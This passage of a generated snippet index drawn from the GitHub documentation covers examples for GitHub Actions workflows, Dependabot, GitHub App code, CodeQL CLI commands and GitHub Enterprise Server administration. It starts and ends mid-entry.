workflow while deleting cache keys.\nset +e\necho \"Deleting caches...\"\nfor cacheKey in $cacheKeysForPR\ndo\n    gh cache delete $cacheKey\ndone\necho \"Done\"\n```\n\n----------------------------------------\n\nTITLE: Define project metadata in pom.xml for Dependabot\nDESCRIPTION: This XML snippet demonstrates how to include the project URL, source code management (SCM) URL, and issue management URL within the `pom.xml` file. Dependabot uses this metadata to enhance pull requests with links to release notes and issue trackers. Replace `OWNER` and `REPOSITORY` with the appropriate values for your project.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/dependabot/ecosystems-supported-by-dependabot/optimizing-java-packages-dependabot.md#_snippet_0\n\nLANGUAGE: xml\nCODE:\n```\n<project>\n  <url>https://github.com/OWNER/REPOSITORY</url>\n  <scm>\n    <url>https://github.com/OWNER/REPOSITORY</url>\n  </scm>\n  <issueManagement>\n    <url>https://github.com/OWNER/REPOSITORY/issues</url>\n  </issueManagement>\n</project>\n```\n\n----------------------------------------\n\nTITLE: Verifying Webhook Signature - Ruby\nDESCRIPTION: This method verifies the signature of the GitHub webhook to ensure the request originates from GitHub and not a malicious third party. It compares the signature in the `X-HUB-Signature` header with a computed signature using the WEBHOOK_SECRET. If they don't match, the request is rejected. It also logs the GitHub event and action.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/creating-github-apps/writing-code-for-a-github-app/building-ci-checks-with-a-github-app.md#_snippet_54\n\nLANGUAGE: ruby\nCODE:\n```\ndef verify_webhook_signature\n  their_signature_header = request.env['HTTP_X_HUB_SIGNATURE'] || 'sha1='\n  method, their_digest = their_signature_header.split('=')\n  our_digest = OpenSSL::HMAC.hexdigest(method, WEBHOOK_SECRET, @payload_raw)\n  halt 401 unless their_digest == our_digest\n\n  # The X-GITHUB-EVENT header provides the name of the event.\n  # The action value indicates the which action triggered the event.\n  logger.debug \"---- received event #{request.env['HTTP_X_GITHUB_EVENT']}\"\n  logger.debug \"----    action #{@payload['action']}\" unless @payload['action'].nil?\nend\n```\n\n----------------------------------------\n\nTITLE: User Repository Pattern\nDESCRIPTION: This Python code implements a `UserRepository` class, encapsulating data access logic for user data. It takes a database connection object as input and provides a `get_user_by_id` method that retrieves a user's display name by ID using a parameterized query to prevent SQL injection. Error handling is included.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/copilot-chat-cookbook/refactoring-code/refactoring-data-access-layers.md#_snippet_2\n\nLANGUAGE: python\nCODE:\n```\n# user_repository.py\nclass UserRepository:\n    def __init__(self, db):\n        self.db = db\n\n    def get_user_by_id(self, user_id):\n        try:\n            self.db.cursor.execute(\"SELECT display_name FROM users WHERE id = ?\", (user_id,))\n            user = self.db.cursor.fetchone()\n            return user\n        except sqlite3.Error as e:\n            print(f\"An error occurred: {e}\")\n            return None\n```\n\n----------------------------------------\n\nTITLE: Python Analogy for COBOL Code\nDESCRIPTION: This Python code snippet provides an analogy for the COBOL code, illustrating how the different divisions and sections in COBOL correspond to Python constructs such as modules, functions, and classes. It demonstrates the declaration of variables and the structure of a function with parameters.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/copilot-chat-cookbook/documenting-code/explaining-legacy-code.md#_snippet_1\n\nLANGUAGE: python\nCODE:\n```\n# In Python, the COBOL divisions would be like:\n\n# IDENTIFICATION DIVISION = module/file name\n# PROGRAM-ID = function name\ndef insert_record():\n    pass\n\n# DATA DIVISION would be like declaring these variables:\nclass WorkingStorage:\n    db_status = \"\"  # WS-DB-STATUS\n    sqlcode = 0     # WS-SQLCODE\n    error_msg = \"\"  # WS-ERROR-MSG\n\n# LINKAGE SECTION is like function parameters\nclass PersonRecord:\n    def __init__(self, person_id: int, person_name: str, person_age: int):\n        self.person_id = person_id    # PERSON-ID\n        self.person_name = person_name # PERSON-NAME\n        self.person_age = person_age   # PERSON-AGE\n        self.success = False          # LS-RESULT\n```\n\n----------------------------------------\n\nTITLE: Conditional rendering for Free, Pro, and GHEC - Liquid\nDESCRIPTION: This code snippet uses Liquid templating to conditionally render a reusable block based on the GitHub product version. Specifically, it checks if the version is either `fpt` (Free, Pro, and Team) or `ghec` (GitHub Enterprise Cloud) and includes the `reusables.user-settings.verify-org-approved-email-domain` snippet if the condition is true. The purpose is to display organization-specific email verification instructions based on the active GitHub plan.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/notifications-v2/email-notification-caveats.md#_snippet_0\n\nLANGUAGE: YAML\nCODE:\n```\n{% ifversion fpt or ghec %}\n{% data reusables.user-settings.verify-org-approved-email-domain %}\n{% endif %}\n```\n\n----------------------------------------\n\nTITLE: Generating HTML, CSS, and JavaScript calculator files\nDESCRIPTION: This example demonstrates how to ask GitHub Copilot to generate a simple calculator using HTML, CSS, and JavaScript. The expected output will be the creation of multiple files, such as `index.html`, `styles.css`, and `script.js`, which can then be viewed and edited.  The AI model uses the prompt to create functional code, which could have dependencies on browser capabilities and specific coding standards.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/using-github-copilot/copilot-chat/asking-github-copilot-questions-in-github.md#_snippet_0\n\nLANGUAGE: plaintext\nCODE:\n```\nGenerate a simple calculator using HTML, CSS, and JavaScript\n```\n\n----------------------------------------\n\nTITLE: Parsing API Response in Ruby\nDESCRIPTION: The `parse_response` function parses responses from the {% data variables.product.company_short %} REST API. If the response status is `200 OK` or `201 Created`, it returns the parsed JSON body. Otherwise, it prints the response and body and exits the program with an error code. It depends on the `Net::HTTPOK` and `Net::HTTPCreated` classes from the `net/http` library, and the `JSON` module.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/creating-github-apps/writing-code-for-a-github-app/building-a-cli-with-a-github-app.md#_snippet_8\n\nLANGUAGE: ruby\nCODE:\n```\ndef parse_response(response)\n  case response\n  when Net::HTTPOK, Net::HTTPCreated\n    JSON.parse(response.body)\n  else\n    puts response\n    puts response.body\n    exit 1\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Stopping and Starting Workflow Commands (Bash)\nDESCRIPTION: This YAML snippet demonstrates how to disable and re-enable workflow commands using the `stop-commands` command.  It generates a unique token, uses it to stop command processing, and then uses the same token to resume command processing.  This is useful for logging content that might accidentally trigger workflow commands.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-what-your-workflow-does/workflow-commands-for-github-actions.md#_snippet_23\n\nLANGUAGE: yaml\nCODE:\n```\njobs:\n  workflow-command-job:\n    runs-on: ubuntu-latest\n    steps:\n      - name: Disable workflow commands\n        run: |\n          echo '::warning:: This is a warning message, to demonstrate that commands are being processed.'\n          stopMarker=$(uuidgen)\n          echo \"::stop-commands::$stopMarker\"\n          echo '::warning:: This will NOT be rendered as a warning, because stop-commands has been invoked.'\n          echo \"::$stopMarker::\"\n          echo '::warning:: This is a warning again, because stop-commands has been turned off.'\n```\n\n----------------------------------------\n\nTITLE: Defining Runner Group in GitHub Actions Workflow (YAML)\nDESCRIPTION: This YAML snippet demonstrates how to define a runner group in a GitHub Actions workflow. The `runs-on` key is used with the `group` property to specify the desired runner group. This configuration ensures that the job will be executed on a runner belonging to the specified group, `ubuntu-runners` in this case. The workflow checks the bats version using node.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/actions/jobs/example-runs-on-groups.md#_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nname: learn-github-actions\non: [push]\njobs:\n  check-bats-version:\n    runs-on: \n      group: ubuntu-runners\n    steps:\n      - uses: {% data reusables.actions.action-checkout %}\n      - uses: {% data reusables.actions.action-setup-node %}\n        with:\n          node-version: '14'\n      - run: npm install -g bats\n      - run: bats -v\n```\n\n----------------------------------------\n\nTITLE: Formatting Disk with GUID Partition Table\nDESCRIPTION: This series of `parted` commands formats the new disk with a GUID partition table, creates necessary partitions (bios, efi, and primary), and sets appropriate flags. Replace `/dev/xvdg` with the actual device name.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/monitoring-and-managing-your-instance/updating-the-virtual-machine-and-physical-resources/increasing-storage-capacity.md#_snippet_5\n\nLANGUAGE: Shell\nCODE:\n```\nsudo parted /dev/xvdg mklabel gpt\nsudo parted -a optimal /dev/xvdg mkpart bios fat32 1MiB 2MiB\nsudo parted /dev/xvdg set 1 bios_grub on\nsudo parted -a optimal /dev/xvdg mkpart efi fat32 2MiB 512MiB\nsudo parted /dev/xvdg set 2 esp on\nsudo parted -a optimal /dev/xvdg mkpart primary 512MiB 50%\nsudo parted /dev/xvdg set 3 boot off\nsudo parted /dev/xvdg set 3 esp off\nsudo parted -a optimal /dev/xvdg mkpart primary 50% 100%\n```\n\n----------------------------------------\n\nTITLE: Building Visual Studio solution with specified arguments in YAML\nDESCRIPTION: This task defines a Visual Studio Build step in an Azure DevOps pipeline. It specifies the solution file pattern, MSBuild arguments (setting the output directory), platform, configuration, and indicates a clean build should be performed.  The `msbuildArgs` parameter sets the output directory for the build artifacts.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/getting-started-with-the-codeql-cli/preparing-your-code-for-codeql-analysis.md#_snippet_24\n\nLANGUAGE: yaml\nCODE:\n```\nsteps:\n    # Execute the pre-defined build step. Note the `msbuildArgs` variable.\n    - task: VSBuild@1\n        inputs:\n          solution: '**/*.sln'\n          msbuildArgs: /p:OutDir=$(Build.ArtifactStagingDirectory)\n          platform: Any CPU\n          configuration: Release\n          # Execute a clean build, in order to remove any existing build artifacts prior to the build.\n          clean: True\n       displayName: Visual Studio Build\n```\n\n----------------------------------------\n\nTITLE: Mapping CI_PROJECT_TITLE to GitHub Actions variable\nDESCRIPTION: Maps the GitLab CI environment variable `CI_PROJECT_TITLE` to the GitHub Actions equivalent `${{ github.event.repository.full_name }}`. Gets the repository name, including owner.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-gitlab-with-github-actions-importer.md#_snippet_43\n\nLANGUAGE: YAML\nCODE:\n```\n${{ github.event.repository.full_name }}\n```\n\n----------------------------------------\n\nTITLE: Configuring Azure Blob Storage for Packages\nDESCRIPTION: This snippet configures GitHub Packages to use Azure Blob Storage for the staging instance. It sets the storage type to \"azure\" and configures the container name and connection string. Replace placeholders with actual values.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/installing-your-enterprise-server/setting-up-a-github-enterprise-server-instance/setting-up-a-staging-instance.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\nghe-config secrets.packages.blob-storage-type \"azure\"\nghe-config secrets.packages.azure-container-name \"AZURE CONTAINER NAME\"\nghe-config secrets.packages.azure-connection-string \"CONNECTION STRING\"\n```\n\n----------------------------------------\n\nTITLE: Viewing Details for a Specific Job using GitHub CLI\nDESCRIPTION: This snippet shows how to view details for a specific job within a workflow run using the `-j` or `--job` flag. Replace `JOB_ID` with the ID of the job.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/monitoring-and-troubleshooting-workflows/monitoring-workflows/viewing-workflow-run-history.md#_snippet_5\n\nLANGUAGE: Shell\nCODE:\n```\ngh run view --job JOB_ID\n```\n\n----------------------------------------\n\nTITLE: Example package.json Configuration\nDESCRIPTION: This shows a complete example of a `package.json` file, including the name, version, description, main entry point, module type, scripts, keywords, author, license, dependencies, and devDependencies. Note that specific versions might vary.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/creating-github-apps/writing-code-for-a-github-app/building-a-github-app-that-responds-to-webhook-events.md#_snippet_5\n\nLANGUAGE: json\nCODE:\n```\n  {\n  \"name\": \"github-app-webhook-tutorial\",\n  \"version\": \"1.0.0\",\n  \"description\": \"\",\n  \"main\": \"index.js\",\n  \"type\": \"module\",\n  \"scripts\": {\n    \"server\": \"node app.js\"\n  },\n  \"keywords\": [],\n  \"author\": \"\",\n  \"license\": \"ISC\",\n  \"dependencies\": {\n    \"dotenv\": \"^16.0.3\",\n    \"octokit\": \"^2.0.14\"\n  },\n  \"devDependencies\": {\n    \"smee-client\": \"^1.2.3\"\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: List All Git Branches\nDESCRIPTION: Demonstrates how to list all available branches (both local and remote) using `git branch -a`. This is useful for identifying alternative branches to checkout when the default branch is unavailable.\nSOURCE: https://github.com/github/docs/blob/main/content/repositories/creating-and-managing-repositories/troubleshooting-cloning-errors.md#_snippet_8\n\nLANGUAGE: shell\nCODE:\n```\n$ git branch -a\n# Lists ALL the branches\n>   remotes/origin/awesome\n>   remotes/origin/more-work\n>   remotes/origin/new-main\n```\n\n----------------------------------------\n\nTITLE: Ignoring Branches and Tags in GitHub Workflow\nDESCRIPTION: This YAML snippet demonstrates how to configure a GitHub Actions workflow to ignore specific branches and tags. The `branches-ignore` section defines patterns to match against branch names, and the `tags-ignore` section defines patterns to match against tag names.  If a push event matches any of these patterns, the workflow will not be triggered.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/actions/workflows/run-on-specific-branches-or-tags3.md#_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\non:\n  push:\n    # Sequence of patterns matched against refs/heads\n    branches-ignore:\n      - 'mona/octocat'\n      - 'releases/**-alpha'\n    # Sequence of patterns matched against refs/tags\n    tags-ignore:\n      - v2\n      - v1.*\n```\n\n----------------------------------------\n\nTITLE: Invoking GitHub Copilot Documentation in Vim/Neovim\nDESCRIPTION: This command allows users to access the GitHub Copilot documentation directly within Vim or Neovim. It provides in-editor guidance on configuring and using the extension.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/managing-copilot/configure-personal-settings/configuring-github-copilot-in-your-environment.md#_snippet_6\n\nLANGUAGE: vim\nCODE:\n```\n:help copilot\n```\n\n----------------------------------------\n\nTITLE: Markdown Content Separator\nDESCRIPTION: This Markdown comment is used as a separator within the autogenerated Markdown files. Content written by content writers above this comment is preserved, while content below is automatically generated by the pipeline. This allows writers to add introductory paragraphs to the automatically generated documentation.\nSOURCE: https://github.com/github/docs/blob/main/src/codeql-cli/README.md#_snippet_3\n\nLANGUAGE: Markdown\nCODE:\n```\n<!-- Content after this section is automatically generated -->\n```\n\n----------------------------------------\n\nTITLE: Conditional Rendering for GitHub Enterprise Server (GHES)\nDESCRIPTION: This snippet conditionally renders text for organizations if {% data variables.product.prodname_GH_code_security %} is enabled. The {% ifversion ghes %} tag checks if the current version is GitHub Enterprise Server.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/gated-features/security-campaigns.md#_snippet_2\n\nLANGUAGE: Liquid\nCODE:\n```\n{% ifversion ghes %}\nOrganizations with [{% data variables.product.prodname_GH_code_security %}](/get-started/learning-about-github/about-github-advanced-security) enabled{% endif %}\n```\n\n----------------------------------------\n\nTITLE: Formatting Language Data for D3\nDESCRIPTION: This Ruby snippet formats the contents of the `language_obj` object into a structure that D3 can understand. The `language_byte_count` is expected to have `name` and `count` attributes.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/guides/rendering-data-as-graphs.md#_snippet_9\n\nLANGUAGE: ruby\nCODE:\n```\nlanguage_obj.each do |lang, count|\n  language_byte_count.push :name => \"#{lang} (#{count})\", :count => count\nend\n```\n\n----------------------------------------\n\nTITLE: Correct Header Structure Example\nDESCRIPTION: Illustrates the recommended header structure in Markdown, starting with H2 and proceeding sequentially to H3 and H4, with text content between headers.\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/style-guide-and-content-model/style-guide.md#_snippet_11\n\nLANGUAGE: Markdown\nCODE:\n```\n## HEADER (H2)\n\nTEXT\n\n### SUBHEADER (H3)\n\nTEXT\n\n#### SUBHEADER (H4)\n\nTEXT\n```\n\n----------------------------------------\n\nTITLE: Querying audit log for Git activity events with date and actor\nDESCRIPTION: This cURL command retrieves audit log events related to Git activity, filtered by a specific date and actor in an enterprise. It requires an authorization token and uses the `phrase` parameter to specify the date and actor, and the `include=git` parameter to include Git events. It will return Git-related audit log events.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/monitoring-activity-in-your-enterprise/reviewing-audit-logs-for-your-enterprise/using-the-audit-log-api-for-your-enterprise.md#_snippet_5\n\nLANGUAGE: shell\nCODE:\n```\ncurl -H \"Authorization: Bearer TOKEN\" \\\n--request GET \\\n\"{% data variables.product.rest_url %}/enterprises/avocado-corp/audit-log?phrase=created:>\\=2024-01-01+actor:octocat&include=git\"\n```\n\n----------------------------------------\n\nTITLE: Go Dependency Submission Workflow (YAML)\nDESCRIPTION: This YAML workflow configures a GitHub Action to calculate and submit Go dependencies to the {% data variables.dependency-submission-api.name %}. It defines the trigger, permissions, environment variables for Go, and the steps to checkout the repository, set up Go, and run the dependency submission action.  The `go-mod-path` and `go-build-target` parameters are used to specify the location of the `go.mod` file and the build target file respectively.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/dependency-submission/premade-action-table.md#_snippet_0\n\nLANGUAGE: YAML\nCODE:\n```\nname: Go Dependency Submission\non:\n  push:\n    branches:\n      - main\n\n# The API requires write permission on the repository to submit dependencies\npermissions:\n  contents: write\n\n# Environment variables to configure Go and Go modules. Customize as necessary\nenv:\n  GOPROXY: '' # A Go Proxy server to be used\n  GOPRIVATE: '' # A list of modules are considered private and not requested from GOPROXY\njobs:\n  go-action-detection:\n    runs-on: ubuntu-latest\n    steps:\n      - name: 'Checkout Repository'\n        uses: {% data reusables.actions.action-checkout %}\n\n      - uses: {% data reusables.actions.action-setup-go %}\n        with:\n          go-version: \">=1.18.0\"\n\n      - name: Run snapshot action\n        uses: actions/go-dependency-submission@v1\n        with:\n            # Required: Define the repo path to the go.mod file used by the\n            # build target\n            go-mod-path: go-example/go.mod\n            #\n            # Optional. Define the repo path of a build target,\n            # a file with a `main()` function.\n            # If undefined, this action will collect all dependencies\n            # used by all build targets for the module. This may\n            # include Go dependencies used by tests and tooling.\n            go-build-target: go-example/cmd/octocat.go\n```\n\n----------------------------------------\n\nTITLE: YAML Workflow Example\nDESCRIPTION: This YAML snippet demonstrates a GitHub Actions workflow for creating and publishing a Docker image. It's triggered on pushes to the `release` branch. The workflow includes a job `run-npm-build` that runs on `ubuntu-latest`. It's used to ensure that YAML code blocks with comments are parsed correctly without errors, particularly after a production bug related to comment handling.\nSOURCE: https://github.com/github/docs/blob/main/src/fixtures/fixtures/content/get-started/foo/code-snippet-with-hashbang.md#_snippet_2\n\nLANGUAGE: yaml\nCODE:\n```\n#\nname: Create and publish a Docker image\n\n# Configures this workflow to run every time a change is pushed to the branch called `release`.\non:\n  push:\n    branches: ['release']\n\njobs:\n# This job checks out the repository contents ...\n# And here's the second comment line.\n  run-npm-build:\n    runs-on: ubuntu-latest\n```\n\n----------------------------------------\n\nTITLE: Configure package.json Type\nDESCRIPTION: This JSON snippet adds the `type` field with the value `module` to the `package.json` file. This configuration is required for using ES modules (import/export) in Node.js.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/creating-github-apps/writing-code-for-a-github-app/building-a-github-app-that-responds-to-webhook-events.md#_snippet_4\n\nLANGUAGE: jsonc\nCODE:\n```\n      {\n       // rest of the JSON object,\n       \"version\": \"1.0.0\",\n       \"description\": \"\",\n       \"type\": \"module\",\n       // rest of the JSON object,\n     }\n```\n\n----------------------------------------\n\nTITLE: Defining Primary Datacenter - Text\nDESCRIPTION: This configuration snippet shows how to define the primary datacenter within the cluster configuration file. The `primary-datacenter` key-value pair within the `[cluster]` section sets the name for the primary datacenter. This name is used to associate nodes with the primary datacenter.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/monitoring-and-managing-your-instance/configuring-clustering/configuring-high-availability-replication-for-a-cluster.md#_snippet_1\n\nLANGUAGE: text\nCODE:\n```\n[cluster]\n  mysql-master = HOSTNAME\n  redis-master = HOSTNAME\n  primary-datacenter = primary\n```\n\n----------------------------------------\n\nTITLE: Example `secrets` Context - JSON\nDESCRIPTION: This JSON snippet shows an example of the `secrets` context. It includes the automatically created `GITHUB_TOKEN` and two other secrets, `NPM_TOKEN` and `SUPERSECRET`. The values are redacted for security.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-what-your-workflow-does/accessing-contextual-information-about-workflow-runs.md#_snippet_15\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"github_token\": \"***\",\n  \"NPM_TOKEN\": \"***\",\n  \"SUPERSECRET\": \"***\"\n}\n```\n\n----------------------------------------\n\nTITLE: Enabling Kubernetes Mode - YAML\nDESCRIPTION: This YAML snippet demonstrates how to enable Kubernetes mode in Actions Runner Controller. Setting `containerMode.type` to `kubernetes` configures ARC to use runner container hooks to create new pods for services, container jobs, or actions. It also shows how to define `kubernetesModeWorkVolumeClaim` to claim persistent volumes.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/hosting-your-own-runners/managing-self-hosted-runners-with-actions-runner-controller/deploying-runner-scale-sets-with-actions-runner-controller.md#_snippet_24\n\nLANGUAGE: yaml\nCODE:\n```\ncontainerMode:\n  type: \"kubernetes\"\n  kubernetesModeWorkVolumeClaim:\n    accessModes: [\"ReadWriteOnce\"]\n    storageClassName: \"dynamic-blob-storage\"\n    resources:\n      requests:\n        storage: 1Gi\n```\n\n----------------------------------------\n\nTITLE: Auto-approving Dependabot Pull Requests with GitHub Actions (YAML)\nDESCRIPTION: This workflow automatically approves Dependabot pull requests using the GitHub CLI. It fetches metadata using the `dependabot/fetch-metadata` action and then approves the pull request.  The workflow requires `pull-requests: write` permission and uses the `GITHUB_TOKEN` secret.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/dependabot/working-with-dependabot/automating-dependabot-with-github-actions.md#_snippet_2\n\nLANGUAGE: YAML\nCODE:\n```\nname: Dependabot auto-approve\non: pull_request\n\npermissions:\n  pull-requests: write\n\njobs:\n  dependabot:\n    runs-on: ubuntu-latest\n    if: github.event.pull_request.user.login == 'dependabot[bot]' && github.repository == 'owner/my_repo'\n    steps:\n      - name: Dependabot metadata\n        id: metadata\n        uses: dependabot/fetch-metadata@d7267f607e9d3fb96fc2fbe83e0af444713e90b7\n        with:\n          github-token: \"${{ secrets.GITHUB_TOKEN }}\"\n      - name: Approve a PR\n        run: gh pr review --approve \"$PR_URL\"\n        env:\n          PR_URL: ${{github.event.pull_request.html_url}}\n          GH_TOKEN: ${{secrets.GITHUB_TOKEN}}\n```\n\n----------------------------------------\n\nTITLE: Updating Help Function in Ruby\nDESCRIPTION: This snippet updates the `help` function to include the `login` command in the usage instructions.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/creating-github-apps/writing-code-for-a-github-app/building-a-cli-with-a-github-app.md#_snippet_14\n\nLANGUAGE: ruby\nCODE:\n```\ndef help\n  puts \"usage: app_cli <login | help>\"\nend\n```\n\n----------------------------------------\n\nTITLE: Verifying NES enablement status using ghe-config\nDESCRIPTION: This snippet shows how to use the `ghe-config` command to check if the Node Eligibility Service (NES) is currently enabled in a GitHub Enterprise Server cluster. It retrieves the value of the `app.nes.enabled` configuration setting.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/monitoring-and-managing-your-instance/configuring-clustering/monitoring-the-health-of-your-cluster-nodes-with-node-eligibility-service.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nghe-config app.nes.enabled\n```\n\n----------------------------------------\n\nTITLE: Defining Environment Name Using Expression - YAML\nDESCRIPTION: This snippet illustrates how to define the environment name using an expression. The `name` property uses `${{ github.ref_name }}` to dynamically set the environment name based on the Git reference name (e.g., branch name).\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/actions/jobs/section-using-environments-for-jobs.md#_snippet_3\n\nLANGUAGE: yaml\nCODE:\n```\nenvironment:\n  name: ${{ github.ref_name }}\n```\n\n----------------------------------------\n\nTITLE: Configuring Analysis Category in CodeQL Analysis (YAML)\nDESCRIPTION: This snippet illustrates how to configure a category for CodeQL analysis. The `category` parameter within the `analyze` action is used to distinguish between multiple analyses for the same tool and commit, especially useful in monorepo scenarios. If not specified, GitHub will automatically generate a category name.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/code-scanning/creating-an-advanced-setup-for-code-scanning/customizing-your-advanced-setup-for-code-scanning.md#_snippet_7\n\nLANGUAGE: yaml\nCODE:\n```\n    - name: Perform CodeQL Analysis\n      uses: {% data reusables.actions.action-codeql-action-analyze %}\n      with:\n        # Optional. Specify a category to distinguish between multiple analyses\n        # for the same tool and ref. If you don't use `category` in your workflow,\n        # GitHub will generate a default category name for you\n        category: \"my_category\"\n```\n\n----------------------------------------\n\nTITLE: Indexing Files with CodeQL Database\nDESCRIPTION: This command indexes standalone files for a CodeQL database using a specified language extractor. It requires the database path and the language as mandatory arguments. Options can be used to control threading, memory allocation, and extractor behavior.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/codeql-cli-manual/database-index-files.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ncodeql database index-files --language=<lang> [--threads=<num>] [--ram=<MB>] [--extractor-option=<extractor-option-name=value>] <options>... -- <database>\n```\n\n----------------------------------------\n\nTITLE: Debug Middleware Tests\nDESCRIPTION: Enables debugging for middleware tests by setting the `$DEBUG_MIDDLEWARE_TESTS` environment variable to `true`.  This allows detailed insight into middleware errors during end-to-end testing. The `-b` flag likely refers to a vitest flag, such as --bail.\nSOURCE: https://github.com/github/docs/blob/main/src/tests/README.md#_snippet_8\n\nLANGUAGE: shell\nCODE:\n```\nexport DEBUG_MIDDLEWARE_TESTS=true\nvitest src/shielding/tests -b\n```\n\n----------------------------------------\n\nTITLE: CodeQL Dataset Cleanup Command\nDESCRIPTION: This shell command cleans up temporary files from a CodeQL dataset. It is intended for use after dataset creation is complete and before further data import is needed. Using the command on datasets still under construction could prevent data import.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/codeql-cli-manual/dataset-cleanup.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\ncodeql dataset cleanup <options>... -- <dataset>\n```\n\n----------------------------------------\n\nTITLE: Conditional Text Rendering with Version Check (Liquid)\nDESCRIPTION: This code snippet uses Liquid templating to conditionally render text. It checks if the `ifversion` variable indicates a 'fpt' or 'ghec' version and displays the first text block. Otherwise, it displays the second text block. This is useful for tailoring content based on the specific platform being used.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/permissions/security-configuration-enterprise-enable.md#_snippet_0\n\nLANGUAGE: Liquid\nCODE:\n```\n{% ifversion fpt or ghec %}Enterprise owners and members with the **admin** role{% else %}Site administrators{% endif %}\n```\n\n----------------------------------------\n\nTITLE: Uploading Support Bundle Directly using SSH (ghe-support-bundle -u)\nDESCRIPTION: This command uses SSH to connect to the GitHub Enterprise Server instance and executes the `ghe-support-bundle` command-line utility with the `-u` option. This option uploads the generated support bundle directly to GitHub's support server. The `-p122` option specifies the port for SSH, `admin@HOSTNAME` specifies the user and hostname of the server. Outbound HTTPS connections over TCP port 443 must be allowed.\nSOURCE: https://github.com/github/docs/blob/main/content/support/contacting-github-support/providing-data-to-github-support.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\nssh -p122 admin@HOSTNAME -- 'ghe-support-bundle -u'\n```\n\n----------------------------------------\n\nTITLE: Defining Script Steps in Azure Pipelines (YAML)\nDESCRIPTION: This YAML snippet demonstrates how to define script steps within an Azure Pipelines job. It showcases the use of `script`, `bash`, `pwsh` keys, and the `PowerShell` task to execute commands in different shells. The job is configured to run on a Windows virtual machine image.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/manually-migrating-to-github-actions/migrating-from-azure-pipelines-to-github-actions.md#_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\njobs:\n  - job: scripts\n    pool:\n      vmImage: 'windows-latest'\n    steps:\n      - script: echo \"This step runs in the default shell\"\n      - bash: echo \"This step runs in bash\"\n      - pwsh: Write-Host \"This step runs in PowerShell Core\"\n      - task: PowerShell@2\n        inputs:\n          script: Write-Host \"This step runs in PowerShell\"\n```\n\n----------------------------------------\n\nTITLE: Generating Query Help with CodeQL CLI\nDESCRIPTION: This command generates end-user query help from .qhelp files, .md files, or .ql files with corresponding help files. It uses the `codeql generate query-help` command with options to specify the format, output location, and input files.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/codeql-cli-manual/generate-query-help.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ncodeql generate query-help --format=<format> [--output=<dir|file>] <options>... -- <qhelp|mdhelp|query|dir|suite>...\n```\n\n----------------------------------------\n\nTITLE: Audit Log Pipeline Flowchart\nDESCRIPTION: This flowchart visualizes the audit log event pipeline, illustrating the steps from retrieving data from the github/audit-log-allowlists repository to transforming the data and preparing it for documentation. It highlights the key scripts and data files involved in the process.\nSOURCE: https://github.com/github/docs/blob/main/src/audit-logs/README.md#_snippet_0\n\nLANGUAGE: mermaid\nCODE:\n```\nflowchart TD\n    Start([Start])-->\n    RunScript[\"Run:\n        src/auditlog/scripts/sync.js\"]-->\n    GetContents[\"getContents() schema.json\n      from github/audit-log-allowlists repo\"]-->\n    SchemaFiles[\"audit log schema file\\n\n        .json\"]-->\n    Transform[\"transform audit log data\n        into docs readable format\"]-->DataForDocs\n    subgraph Transform [\"transform\"]\n    t[\"transform audit log data into docs readable format\"]-->\n    o[\"organize events by version and page\"]-->t\n    end\n    DataForDocs[\"Only content from audit log data\n        that is rendered in the docs\\n\n        .json\"]-->\n    End([End])\n\n    style Start fill:#19AA9B,color:#FFF\n    style SchemaFiles fill:#E6E6E6\n    style DataForDocs fill:#E6E6E6\n    style End fill:#F7C325\n```\n\n----------------------------------------\n\nTITLE: Conditional Logic: Feature Availability (ifversion)\nDESCRIPTION: These snippets use conditional logic (`{% ifversion ... %}`) to determine whether certain features or functionalities are available based on the GitHub Enterprise Server (GHES) version. The content within the `ifversion` block is only rendered if the specified version condition is met. This allows for customized documentation based on the user's specific GHES deployment.\nSOURCE: https://github.com/github/docs/blob/main/content/organizations/managing-peoples-access-to-your-organization-with-roles/roles-in-an-organization.md#_snippet_0\n\nLANGUAGE: 